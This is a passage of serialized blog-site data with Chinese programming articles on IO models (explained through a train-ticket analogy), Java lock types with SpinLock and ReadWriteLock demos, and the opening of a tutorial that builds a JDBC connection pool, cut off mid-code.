异步非阻塞IO\n吞吐量           低        中        高        高\n编程复杂度         简单       简单       非常复杂     复杂\n\n\n# 结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合\n\n\n# 同步阻塞（Synchronous Blocking）\n\n买票者在售票窗口排队等待购票，当轮到自己时，提交购票请求并等待售票员完成购票操作后才能继续下一步操作。\n\n在这个过程中，买票者是同步等待售票操作的完成，阻塞其他任务的执行。\n\n * 同步：提交购票请求后，等待请求结果。\n * 阻塞：一直在窗口等着。\n\n\n# 同步非阻塞（Synchronous Non-blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n买票者会定期回来询问售票员购票的进度，直到购票操作完成并获取购票结果。\n\n在这个过程中，买票者是同步地等待售票结果，但不会阻塞其他任务的执行。\n\n * 同步：提交购票请求后，等待请求结果。\n * 非阻塞：等待请求结果期间，可以去接个水，回来看看有没有结果；泡个面，回来看看有没有结果；上个WC，回来看看有没有结果。\n\n\n# 异步阻塞（Asynchronous Blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n售票员在购票操作完成后，主动通知买票者购票结果。\n\n但是买票者需要等待售票员的通知（通知后自己去取票），这是一个阻塞操作，但期间可以进行其他任务。\n\n * 异步：提交购票请求后，直接回老家干活去了。\n * 阻塞：等待通知，然后自己去取票。\n\n\n# 异步非阻塞（Asynchronous Non-blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n售票员在购票操作完成后，通过回调函数或事件通知买票者购票结果（直接快递到家）。\n\n买票者无需等待售票员的通知，可以继续执行其他任务，而在购票结果准备好时，会触发回调函数或处理事件（直接快递到家）。\n\n * 异步：提交购票请求后，直接回老家干活去了。\n * 非阻塞：无需等待通知，直接快递到家。\n\n\n# IO多路复用（IO Multiplexing）\n\n火车站设置了一个信息显示屏，上面显示了可用车票的信息。\n\n买票者可以自由地观察信息显示屏上的车票情况，无需排队等待。一旦有票可用，买票者可以立即前往指定窗口进行购票。\n\n多个售票窗口的状态由系统进行监控和管理，买票者只需关注信息显示屏上的变化即可，避免了排队等待的阻塞。\n\n\n# 实际场景总结\n\n在火车站买票的场景中：\n\n同步阻塞模型是提交购票请求并一直等待，同步非阻塞模型允许买票者在等待购票结果时做其他事情。\n\n异步阻塞模型中买票者需要等待售票员的通知，而异步非阻塞模型中买票者无需等待售票员通知，可以继续执行其他任务。\n\n而IO多路复用模型通过信息显示屏的方式，使买票者可以观察多个窗口的状态，选择合适的窗口购票，避免了排队等待的阻塞。\n\n\n# 参考\n\n * BIO、NIO、Netty示例demo",normalizedContent:" * 简单理解各io模型\n   * 1. 阻塞io模型\n   * 2. 非阻塞io模型\n   * 3. io复用模型\n   * 4. 信号驱动io模型\n   * 5. 异步io模型\n * 总结\n * 结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合\n   * 同步阻塞（synchronous blocking）\n   * 同步非阻塞（synchronous non-blocking）\n   * 异步阻塞（asynchronous blocking）\n   * 异步非阻塞（asynchronous non-blocking）\n   * io多路复用（io multiplexing）\n * 实际场景总结\n * 参考\n\n\n\n借用知乎用于 levin 的回答，对各种模型讲个故事，描述下各个io模型的区别。\n\n\n# 简单理解各io模型\n\n故事情节为：老李去买火车票，三天后买到一张退票。参演人员（老李，黄牛，售票员，快递员），往返车站耗费1小时。\n\n\n# 1. 阻塞io模型\n\n老李去火车站买票，排队三天买到一张退票。\n\n耗费：在车站吃喝拉撒睡 3天，其他事一件没干。\n\n\n# 2. 非阻塞io模型\n\n老李去火车站买票，隔12小时去火车站问有没有退票，三天后买到一张票。\n\n耗费：往返车站6次，路上6小时，其他时间做了好多事。\n\n\n# 3. io复用模型\n\n * select/poll（有selector选择器，去轮询选择器）\n\n老李去火车站买票，委托黄牛，然后每隔6小时电话黄牛询问，黄牛三天内买到票，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，黄牛手续费100元，打电话17次\n\n * epoll（事件回调）\n\n老李去火车站买票，委托黄牛，黄牛买到后即通知老李去领，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，黄牛手续费100元，无需打电话\n\n\n# 4. 信号驱动io模型\n\n老李去火车站买票，给售票员留下电话，有票后，售票员电话通知老李，然后老李去火车站交钱领票。\n\n耗费：往返车站2次，路上2小时，免黄牛费100元，无需打电话\n\n\n# 5. 异步io模型\n\n老李去火车站买票，给售票员留下电话，有票后，售票员电话通知老李并快递送票上门。\n\n耗费：往返车站1次，路上1小时，免黄牛费100元，无需打电话\n\n\n# 总结\n\n1同2的区别是：自己轮询\n\n2同3的区别是：委托黄牛\n\n3同4的区别是：电话代替黄牛\n\n4同5的区别是：电话通知是自取还是送票上门\n\n * 阻塞io模型：单线程一直阻塞直到事件发生才处理，期间干不了其他事情\n\n * 非阻塞io模型：while(true) 不断循环看有没有事件发生才处理，期间可以干其他事情，但是需要自己不断的去监测\n\n * io复用模型：基于事件驱动（类似与页面的一个button一个事件），有事件发生才处理，期间可以干其他事情，可以理解有一个中间人selector替我们监听， 有事件后通知我们去处理\n\n              同步阻塞io   伪异步io    nio      aio\n客户端数目 ：io线程   1 : 1    m : n    m : 1    m : 0\nio模型          同步阻塞io   同步阻塞io   同步阻塞io   异步非阻塞io\n吞吐量           低        中        高        高\n编程复杂度         简单       简单       非常复杂     复杂\n\n\n# 结合实际场景，理解同步、异步、阻塞、非阻塞的两两组合\n\n\n# 同步阻塞（synchronous blocking）\n\n买票者在售票窗口排队等待购票，当轮到自己时，提交购票请求并等待售票员完成购票操作后才能继续下一步操作。\n\n在这个过程中，买票者是同步等待售票操作的完成，阻塞其他任务的执行。\n\n * 同步：提交购票请求后，等待请求结果。\n * 阻塞：一直在窗口等着。\n\n\n# 同步非阻塞（synchronous non-blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n买票者会定期回来询问售票员购票的进度，直到购票操作完成并获取购票结果。\n\n在这个过程中，买票者是同步地等待售票结果，但不会阻塞其他任务的执行。\n\n * 同步：提交购票请求后，等待请求结果。\n * 非阻塞：等待请求结果期间，可以去接个水，回来看看有没有结果；泡个面，回来看看有没有结果；上个wc，回来看看有没有结果。\n\n\n# 异步阻塞（asynchronous blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n售票员在购票操作完成后，主动通知买票者购票结果。\n\n但是买票者需要等待售票员的通知（通知后自己去取票），这是一个阻塞操作，但期间可以进行其他任务。\n\n * 异步：提交购票请求后，直接回老家干活去了。\n * 阻塞：等待通知，然后自己去取票。\n\n\n# 异步非阻塞（asynchronous non-blocking）\n\n买票者向售票窗口提交购票请求后，不需要等待售票员立即返回结果，而是离开售票窗口进行其他任务。\n\n售票员在购票操作完成后，通过回调函数或事件通知买票者购票结果（直接快递到家）。\n\n买票者无需等待售票员的通知，可以继续执行其他任务，而在购票结果准备好时，会触发回调函数或处理事件（直接快递到家）。\n\n * 异步：提交购票请求后，直接回老家干活去了。\n * 非阻塞：无需等待通知，直接快递到家。\n\n\n# io多路复用（io multiplexing）\n\n火车站设置了一个信息显示屏，上面显示了可用车票的信息。\n\n买票者可以自由地观察信息显示屏上的车票情况，无需排队等待。一旦有票可用，买票者可以立即前往指定窗口进行购票。\n\n多个售票窗口的状态由系统进行监控和管理，买票者只需关注信息显示屏上的变化即可，避免了排队等待的阻塞。\n\n\n# 实际场景总结\n\n在火车站买票的场景中：\n\n同步阻塞模型是提交购票请求并一直等待，同步非阻塞模型允许买票者在等待购票结果时做其他事情。\n\n异步阻塞模型中买票者需要等待售票员的通知，而异步非阻塞模型中买票者无需等待售票员通知，可以继续执行其他任务。\n\n而io多路复用模型通过信息显示屏的方式，使买票者可以观察多个窗口的状态，选择合适的窗口购票，避免了排队等待的阻塞。\n\n\n# 参考\n\n * bio、nio、netty示例demo",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Java 中的各种锁",frontmatter:{title:"Java 中的各种锁",date:"2020-04-27T00:00:00.000Z",tags:["Java"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/javaLock.html",relativePath:"views/backend/javaLock.md",key:"v-acb3fda4",path:"/views/backend/javaLock.html",headers:[{level:2,title:"公平锁",slug:"公平锁",normalizedTitle:"公平锁",charIndex:3},{level:2,title:"非公平锁",slug:"非公平锁",normalizedTitle:"非公平锁",charIndex:2},{level:2,title:"可重入锁",slug:"可重入锁",normalizedTitle:"可重入锁",charIndex:7},{level:2,title:"自旋锁:",slug:"自旋锁",normalizedTitle:"自旋锁:",charIndex:51},{level:2,title:"读写锁",slug:"读写锁",normalizedTitle:"读写锁",charIndex:16},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:66}],excerpt:"<Boxx/>\n<p>公平非公平锁，可重入锁，自旋锁，读写锁等。</p>\n",headersStr:"公平锁 非公平锁 可重入锁 自旋锁: 读写锁 其他",content:'公平非公平锁，可重入锁，自旋锁，读写锁等。\n\n\n\n * 公平锁\n * 非公平锁\n * 可重入锁\n * 自旋锁:\n * 读写锁\n * 其他\n\n\n\n\n# 公平锁\n\n指根据线程在队列中的优先级获取锁，比如线程优先加入阻塞队列，那么线程就优先获取锁（火车站买票排队）\n\n\n# 非公平锁\n\n指在获取锁的时候，每个线程都会去争抢，并且都有机会获取到锁，无关线程的优先级（火车站买票可插队）\n\n\n# 可重入锁\n\n一个线程获取到锁后，如果继续遇到被相同锁修饰的资源或方法，那么可以继续获取该锁（允许多道锁，小区门口上锁，单元门上锁，厕所再上一把锁）\n\n对 synchronized 来说，每个锁都有线程持有者和锁计数器，每次线程获取到锁,会记录下改线程，并且锁的计数器就+1，当线程退出synchronized代码块的时候，线程计数就会-1，当锁计数为0的时候，就释放锁。\n\n\n# 自旋锁:\n\n指当锁被获取后，其他线程并不会停止获取，而是一直去尝试获取（while + CAS实现的锁，各自线程不断地去看锁有没有释放）\n\npublic class SpinLock {\n\n    private static final AtomicReference<Thread> atomicReference = new AtomicReference<>();\n\n    public  void lock(){\n        //当前线程作为锁资源\n        Thread thread = Thread.currentThread();\n\n        //如果期盼值是null,也就是代表没有锁引用了,就设置为当前线程引用,如果不成功就while\n        while (!atomicReference.compareAndSet(null,thread)){\n\n        }\n    }\n\n    public  void unlock(){\n        //当前获取锁的线程\n        Thread thread = Thread.currentThread();\n        \n        //释放锁,让下一个线程获取\n        atomicReference.compareAndSet(thread,null);\n    }\n    \n    public static void main(String[] args) throws Exception{\n        SpinLock spinLock = new SpinLock();\n\n        new Thread(()->{\n            spinLock.lock();\n            //其他操作...\n            spinLock.unlock();\n        },"A").start();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n这样做的好处是减少上下文开销，缺点是增加cpu消耗。\n\nCAS底层就使用了自旋操作（不是自旋锁，而是如果预期值和原值比较不成功就会一直比较）\n\n\n# 读写锁\n\n * 独占锁:（一个坑只能有一个人拉屎）\n   \n   锁一次只能被一个线程占有使用，Synchronized和ReetrantLock都是独占锁。\n\n * 共享锁:（允许多个人同时看到那个牌子：厕所有人，正在拉屎。。）\n   \n   锁可以被多个线程持有，对于ReentrantReadWriteLock而言，它的读锁是共享锁，写锁是独占锁 。\n\n//模拟hibernate缓存被读和被写\npublic class ReadWriteLockDemo{\n    \n    static class Cache{\n        //用map来充当缓存容器\n        private HashMap<String,Object> cache = new HashMap<>();\n        private ReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n\t\t\n        public void put(String key , Object val){\n            readWriteLock.writeLock().lock();\n            try{\n                System.out.println(Thread.currentThread().getName()+" 开始写入");\n                cache.put(key,val);\n                System.out.println(Thread.currentThread().getName()+" 写入完成");\n            }\n            catch(Exception e){\n                e.printStackTrace();\n            }\n            finally{\n                readWriteLock.writeLock().unlock();\n            }\n        }\n\n\n        public void get(String key)\n        {\n            readWriteLock.readLock().lock();\n            try{\n                System.out.println(Thread.currentThread().getName() + " 开始读取");\n                Object obj = cache.get(key);\n                System.out.println(Thread.currentThread().getName() + " 读取完成 : " + obj);\n            }\n            catch(Exception e){\n                e.printStackTrace();\n            }\n            finally{\n               readWriteLock.readLock().unlock();\n            }\n        }\n    }\n\n    public static void main(String[] args){\n        Cache cache = new Cache();\n        for (int i = 0 ; i < 5; ++i){\n            final int tempI = i;\n            new Thread(()->{\n               cache.put(String.valueOf(tempI),tempI);\n            }).start();\n        }\n\n        for (int i = 0 ; i < 5; ++i){\n            final int tempI = i;\n            new Thread(()->{\n                cache.get(String.valueOf(tempI));\n            }).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 其他\n\n * 刚发现美团写的不错 -- 传送门',normalizedContent:'公平非公平锁，可重入锁，自旋锁，读写锁等。\n\n\n\n * 公平锁\n * 非公平锁\n * 可重入锁\n * 自旋锁:\n * 读写锁\n * 其他\n\n\n\n\n# 公平锁\n\n指根据线程在队列中的优先级获取锁，比如线程优先加入阻塞队列，那么线程就优先获取锁（火车站买票排队）\n\n\n# 非公平锁\n\n指在获取锁的时候，每个线程都会去争抢，并且都有机会获取到锁，无关线程的优先级（火车站买票可插队）\n\n\n# 可重入锁\n\n一个线程获取到锁后，如果继续遇到被相同锁修饰的资源或方法，那么可以继续获取该锁（允许多道锁，小区门口上锁，单元门上锁，厕所再上一把锁）\n\n对 synchronized 来说，每个锁都有线程持有者和锁计数器，每次线程获取到锁,会记录下改线程，并且锁的计数器就+1，当线程退出synchronized代码块的时候，线程计数就会-1，当锁计数为0的时候，就释放锁。\n\n\n# 自旋锁:\n\n指当锁被获取后，其他线程并不会停止获取，而是一直去尝试获取（while + cas实现的锁，各自线程不断地去看锁有没有释放）\n\npublic class spinlock {\n\n    private static final atomicreference<thread> atomicreference = new atomicreference<>();\n\n    public  void lock(){\n        //当前线程作为锁资源\n        thread thread = thread.currentthread();\n\n        //如果期盼值是null,也就是代表没有锁引用了,就设置为当前线程引用,如果不成功就while\n        while (!atomicreference.compareandset(null,thread)){\n\n        }\n    }\n\n    public  void unlock(){\n        //当前获取锁的线程\n        thread thread = thread.currentthread();\n        \n        //释放锁,让下一个线程获取\n        atomicreference.compareandset(thread,null);\n    }\n    \n    public static void main(string[] args) throws exception{\n        spinlock spinlock = new spinlock();\n\n        new thread(()->{\n            spinlock.lock();\n            //其他操作...\n            spinlock.unlock();\n        },"a").start();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n这样做的好处是减少上下文开销，缺点是增加cpu消耗。\n\ncas底层就使用了自旋操作（不是自旋锁，而是如果预期值和原值比较不成功就会一直比较）\n\n\n# 读写锁\n\n * 独占锁:（一个坑只能有一个人拉屎）\n   \n   锁一次只能被一个线程占有使用，synchronized和reetrantlock都是独占锁。\n\n * 共享锁:（允许多个人同时看到那个牌子：厕所有人，正在拉屎。。）\n   \n   锁可以被多个线程持有，对于reentrantreadwritelock而言，它的读锁是共享锁，写锁是独占锁 。\n\n//模拟hibernate缓存被读和被写\npublic class readwritelockdemo{\n    \n    static class cache{\n        //用map来充当缓存容器\n        private hashmap<string,object> cache = new hashmap<>();\n        private readwritelock readwritelock = new reentrantreadwritelock();\n\t\t\n        public void put(string key , object val){\n            readwritelock.writelock().lock();\n            try{\n                system.out.println(thread.currentthread().getname()+" 开始写入");\n                cache.put(key,val);\n                system.out.println(thread.currentthread().getname()+" 写入完成");\n            }\n            catch(exception e){\n                e.printstacktrace();\n            }\n            finally{\n                readwritelock.writelock().unlock();\n            }\n        }\n\n\n        public void get(string key)\n        {\n            readwritelock.readlock().lock();\n            try{\n                system.out.println(thread.currentthread().getname() + " 开始读取");\n                object obj = cache.get(key);\n                system.out.println(thread.currentthread().getname() + " 读取完成 : " + obj);\n            }\n            catch(exception e){\n                e.printstacktrace();\n            }\n            finally{\n               readwritelock.readlock().unlock();\n            }\n        }\n    }\n\n    public static void main(string[] args){\n        cache cache = new cache();\n        for (int i = 0 ; i < 5; ++i){\n            final int tempi = i;\n            new thread(()->{\n               cache.put(string.valueof(tempi),tempi);\n            }).start();\n        }\n\n        for (int i = 0 ; i < 5; ++i){\n            final int tempi = i;\n            new thread(()->{\n                cache.get(string.valueof(tempi));\n            }).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 其他\n\n * 刚发现美团写的不错 -- 传送门',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 JDBC 连接池",frontmatter:{title:"手写 JDBC 连接池",date:"2024-10-08T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/jdbc-pool-source-01.html",relativePath:"views/backend/jdbc-pool-source-01.md",key:"v-833f7658",path:"/views/backend/jdbc-pool-source-01.html",headers:[{level:2,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:117},{level:2,title:"项目结构概览",slug:"项目结构概览",normalizedTitle:"项目结构概览",charIndex:125},{level:3,title:"主要模块介绍",slug:"主要模块介绍",normalizedTitle:"主要模块介绍",charIndex:137},{level:2,title:"核心模块解析实现",slug:"核心模块解析实现",normalizedTitle:"核心模块解析实现",charIndex:147},{level:3,title:"连接池接口设计",slug:"连接池接口设计",normalizedTitle:"连接池接口设计",charIndex:161},{level:3,title:"连接池实现",slug:"连接池实现",normalizedTitle:"连接池实现",charIndex:174},{level:3,title:"连接对象管理",slug:"连接对象管理",normalizedTitle:"连接对象管理",charIndex:185},{level:3,title:"配置管理",slug:"配置管理",normalizedTitle:"配置管理",charIndex:197},{level:3,title:"添加配置文件",slug:"添加配置文件",normalizedTitle:"添加配置文件",charIndex:207},{level:3,title:"简化连接池管理",slug:"简化连接池管理",normalizedTitle:"简化连接池管理",charIndex:219},{level:2,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:230},{level:3,title:"编写测试程序",slug:"编写测试程序",normalizedTitle:"编写测试程序",charIndex:238},{level:3,title:"查看结果",slug:"查看结果",normalizedTitle:"查看结果",charIndex:250}],excerpt:'<Boxx/>\n<p>在现代应用程序中，数据库连接池是提升性能和资源管理的关键组件。本文将从零开始，详细讲解如何实现一个高效的 JDBC 连接池。无论你是初学者还是有一定经验的开发者，相信本文都能为你提供有价值的指导。</p>\n<p>项目代码地址：<a href="https://github.com/zpj80231/snail/tree/main/snail-source-code/source-jdbc-connection-pool" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a></p>\n',headersStr:"环境准备 项目结构概览 主要模块介绍 核心模块解析实现 连接池接口设计 连接池实现 连接对象管理 配置管理 添加配置文件 简化连接池管理 测试 编写测试程序 查看结果",content:'在现代应用程序中，数据库连接池是提升性能和资源管理的关键组件。本文将从零开始，详细讲解如何实现一个高效的 JDBC 连接池。无论你是初学者还是有一定经验的开发者，相信本文都能为你提供有价值的指导。\n\n项目代码地址：传送门\n\n\n\n * 环境准备\n * 项目结构概览\n   * 主要模块介绍\n * 核心模块解析实现\n   * 连接池接口设计\n   * 连接池实现\n   * 连接对象管理\n   * 配置管理\n   * 添加配置文件\n   * 简化连接池管理\n * 测试\n   * 编写测试程序\n   * 查看结果\n\n\n\n\n# 环境准备\n\n在开始之前，请确保你的开发环境具备以下条件：\n\n * JDK 8 或以上：确保你已经安装了 Java 开发环境，可以通过 java -version 命令检查。\n * Maven：用于项目的依赖管理和构建。\n * IDE：推荐使用 IntelliJ IDEA 或 Eclipse 进行开发和调试。\n\n\n# 项目结构概览\n\nJDBC 连接池模块主要包含以下几个核心部分：\n\n(base) ~/IdeaProjects/snail/snail-source-code/source-jdbc-connection-pool\n├── pom.xml\n└── src\n    ├── main\n    │   ├── java\n    │   │   └── com\n    │   │       └── snail\n    │   │           └── source\n    │   │               └── code\n    │   │                   └── jdbc\n    │   │                       └── connection\n    │   │                           ├── domain\n    │   │                           │   └── PoolEntry.java\n    │   │                           ├── manager\n    │   │                           │   └── ConnectionPoolManager.java\n    │   │                           ├── pool\n    │   │                           │   ├── ConnectionPool.java\n    │   │                           │   └── SimpleConnectionPool.java\n    │   │                           └── properties\n    │   │                               └── DataSourceProperties.java\n    │   └── resources\n    │       └── db.properties\n    └── test\n        └── java\n            └── com\n                └── snail\n                    └── source\n                        └── code\n                            └── jdbc\n                                └── connection\n                                    └── TestDataSource.java\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 主要模块介绍\n\n * PoolEntry 接口：封装实际的 JDBC 连接对象。\n * ConnectionPoolManager 类：简化连接池操作的管理者，提供了一组静态方法来获取和释放数据库连接。\n * ConnectionPool 类：定义获取和释放数据库连接的方法。\n * SimpleConnectionPool 类：ConnectionPool 接口的具体实现。\n * DataSourceProperties 类：管理连接池的配置参数。\n\n\n# 核心模块解析实现\n\n接下来，我们将逐个模块进行详细解析，理解其设计思想和实现细节。\n\n\n# 连接池接口设计\n\nConnectionPool 定义了连接池的基本操作接口，包括获取连接、释放连接、关闭连接池等方法。\n\npackage com.snail.source.code.jdbc.connection.pool;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\n\n/**\n * 连接池\n *\n * @author zhangpengjun\n * @date 2024/8/21\n */\npublic interface ConnectionPool {\n\n    /**\n     * 获取连接\n     *\n     * @return {@link Connection }\n     */\n    Connection getConnection();\n\n    /**\n     * 释放连接\n     *\n     * @param conn 连接\n     */\n    void releaseConnection(Connection conn);\n\n    /**\n     * 关闭连接池\n     */\n    void shutdown() throws SQLException;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n解析：\n\n * getConnection()：从连接池中获取一个可用的数据库连接。\n * releaseConnection(Connection connection)：将使用完毕的连接归还给连接池。\n * shutdown()：关闭连接池，释放所有资源。\n\n\n# 连接池实现\n\nSimpleConnectionPool 是 ConnectionPool 接口的具体实现，负责管理连接的创建、分配和回收。\n\npackage com.snail.source.code.jdbc.connection.pool;\n\nimport com.snail.source.code.jdbc.connection.domain.PoolEntry;\nimport com.snail.source.code.jdbc.connection.properties.DataSourceProperties;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.util.List;\nimport java.util.TimerTask;\nimport java.util.concurrent.CopyOnWriteArrayList;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * @author zhangpengjun\n * @date 2024/8/21\n */\n@Slf4j\npublic class SimpleConnectionPool implements ConnectionPool {\n\n    /**\n     * 连接池配置\n     */\n    DataSourceProperties config;\n    /**\n     * 当前连接数\n     */\n    private final AtomicInteger currentConnectCount = new AtomicInteger(0);\n    /**\n     * 空闲中的连接池\n     */\n    List<Connection> freePools = new CopyOnWriteArrayList<>();\n    /**\n     * 正在使用中的连接池\n     */\n    List<PoolEntry> usedPools = new CopyOnWriteArrayList<>();\n    /**\n     * 调度器\n     */\n    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1, runnable -> {\n        Thread thread = new Thread(runnable);\n        thread.setDaemon(true); // 设置为守护线程\n        return thread;\n    });\n\n    public SimpleConnectionPool(DataSourceProperties config) {\n        this.config = config;\n        initializePool();\n    }\n\n    @Override\n    public synchronized Connection getConnection() {\n        Connection conn = null;\n        if (usedPools.size() < config.getMaxSize()) {\n            // 优先从空闲连接池获取连接，空闲连接池满的情况下判断是否达到最大连接数，没达到最大连接数则继续创建连接\n            String connectionFrom;\n            if (!freePools.isEmpty()) {\n                conn = freePools.get(0);\n                freePools.remove(conn);\n                connectionFrom = "从空闲连接池获取连接";\n            } else {\n                // 空闲连接池已满，未达到最大连接数，新建连接\n                conn = createConn();\n                connectionFrom = "空闲连接池已满，未达到最大连接数，新建连接";\n            }\n            // 对连接进行校验，通过就放入活跃连接池\n            if (isAlive(conn)) {\n                usedPools.add(new PoolEntry(conn, true, System.currentTimeMillis()));\n                log.info("[{}]，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                        connectionFrom, currentConnectCount.get(), config.getMaxSize(), freePools.size(), usedPools.size());\n            } else {\n                return getConnection();\n            }\n        } else {\n            // 空闲连接池已满，达到最大连接数，等待后重试\n            try {\n                this.wait(100);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new RuntimeException(e);\n            }\n            log.info("[空闲连接池已满，达到最大连接数]，等待后重试。当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentConnectCount.get(), config.getMaxSize(), freePools.size(), usedPools.size());\n        }\n        return conn;\n    }\n\n    @Override\n    public synchronized void releaseConnection(Connection conn) {\n        if (!isAlive(conn)) {\n            return;\n        }\n        // 从活跃连接池移除\n        for (PoolEntry entry : usedPools) {\n            if (entry.getConnection() == conn) {\n                usedPools.remove(entry);\n                break;\n            }\n        }\n        // 空闲连接池没满，则归还到空闲连接池，否则关闭连接\n        if (freePools.size() < config.getMaxSize()) {\n            freePools.add(conn);\n            log.info("[归还连接到空闲连接池]，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentConnectCount.get(), config.getMaxSize(), freePools.size(), usedPools.size());\n        } else {\n            // 关闭连接\n            try {\n                conn.close();\n                currentConnectCount.decrementAndGet();\n            } catch (SQLException e) {\n                log.error("关闭连接失败", e);\n            }\n        }\n        notifyAll();\n    }\n\n    @Override\n    public synchronized void shutdown() throws SQLException {\n        // 关闭活跃连接\n        for (PoolEntry entry : usedPools) {\n            releaseConnection(entry.getConnection());\n        }\n        // 关闭空闲连接\n        for (Connection conn : freePools) {\n            conn.close();\n            currentConnectCount.decrementAndGet();\n        }\n    }\n\n    /**\n     * 创建连接\n     *\n     * @return {@link Connection }\n     */\n    private synchronized Connection createConn(){\n        Connection conn = null ;\n        try {\n            conn = DriverManager.getConnection(config.getUrl(), config.getUsername(), config.getPassword());\n            currentConnectCount.incrementAndGet();\n        } catch (SQLException e) {\n            log.error("创建连接失败", e);\n        }\n        return conn;\n    }\n\n    /**\n     * 校验是否有效\n     *\n     * @param conn 连接\n     * @return boolean\n     */\n    private boolean isAlive(Connection conn) {\n        try {\n            return conn != null && conn.isValid(1000);\n        } catch (SQLException e) {\n            log.error("校验连接是否有效失败", e);\n        }\n        return false;\n    }\n\n    /**\n     * 初始化\n     * <br>\n     * 根据配置加载连接到默认的空闲连接池\n     */\n    private void initializePool() {\n        // 获取连接池 initSize 配置，获取连接加载到空闲连接池\n        try {\n            Class.forName(config.getDriver());\n            for (int i = 0; i < config.getInitSize(); i++) {\n                Connection conn = createConn();\n                freePools.add(conn);\n            }\n            log.info("初始化连接池，当前连接数：{}，初始化连接数：{}, 最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                    currentConnectCount.get(), config.getInitSize(), config.getMaxSize(), freePools.size(), usedPools.size());\n        } catch (ClassNotFoundException e) {\n            log.error("加载驱动失败", e);\n            throw new RuntimeException(e);\n        }\n        check();\n    }\n\n    /**\n     * 开启定时任务检测连接\n     * 1. 定时检查空闲连接池：检查连接是否可用，如果不可用，则关闭连接，并从空闲连接池中移除\n     * 2. 定时检查正在使用的连接池：检查连接是否超时，如果超时，则关闭连接，并从正在使用的连接池中移除\n     * 3. 定时检查最小连接数：如果空闲连接池小于最小连接数，则创建连接加载到空闲连接池\n     */\n    private void check() {\n        if (Boolean.TRUE.equals(config.getHealth())) {\n            scheduler.scheduleAtFixedRate(new CheckTask(), config.getDelay(), config.getPeriod(), TimeUnit.MILLISECONDS);\n        }\n    }\n\n    class CheckTask extends TimerTask {\n        @Override\n        public void run() {\n            // 1. 定时检查空闲连接池：检查连接是否可用，如果不可用，则关闭连接，并从空闲连接池中移除\n            for (Connection conn : freePools) {\n                if (!isAlive(conn)) {\n                    try {\n                        conn.close();\n                    } catch (SQLException e) {\n                        log.error("检测到连接不可用，关闭连接失败", e);\n                    }\n                    freePools.remove(conn);\n                    currentConnectCount.decrementAndGet();\n                    log.info("检测到连接不可用，关闭连接，当前连接数：{}，最大连接数：{}，空闲连接池：{}，正在使用的连接池：{}",\n                            currentConnectCount.get(), config.getMaxSize(), freePools.size(), usedPools.size());\n                }\n            }\n            // 2. 定时检查正在使用的连接池：检查连接是否超时，如果超时，则关闭连接，并从正在使用的连接池中移除\n            for (PoolEntry poolEntry : usedPools) {\n                if (System.currentTimeMillis() - 